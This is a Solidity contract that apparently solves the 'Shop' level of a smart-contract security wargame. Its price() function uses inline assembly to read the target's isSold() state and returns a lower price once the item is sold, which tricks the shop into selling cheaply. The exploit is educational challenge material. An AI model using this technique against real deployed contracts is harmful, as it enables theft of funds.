// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract Solution {
    Shop _level;

    constructor(address _levelInstance) public {
        _level = Shop(_levelInstance);
    }

    function price() public returns (uint256) {
        // References:
        // https://ethervm.io/
        // https://docs.soliditylang.org/en/v0.6.12/assembly.html
        assembly {
            // Store function signature of `isSold()` in memory at offset `0x100`, can be obtained
            // using `seth calldata "isSold()"`.
            mstore(0x100, 0xe852e741)
            // Use `gas()` to get remaining gas.
            // Use `sload(0x0)` to get the level instance address stored at slot 0.
            // Function signature is stored in memory at offset 0x100 with 32 bytes. To access the
            // last 4 bytes where the signature is, use offset `sub(0x120, 0x4)`, and length `0x4`.
            // Store the return value at `0x120` with 32 bytes.
            let result := staticcall(gas(), sload(0x0), sub(0x120, 0x4), 0x4, 0x120, 0x20)
            // Store `100 * (1 - isSold)` at memory offset `0x140`.
            mstore(0x140, mul(0x64, sub(1, mload(0x120))))
            // Return the 32-bytes value in memory at offset `0x140`.
            return(0x140, 0x20)
        }
    }

    function buy() public {
        _level.buy();
    }
}
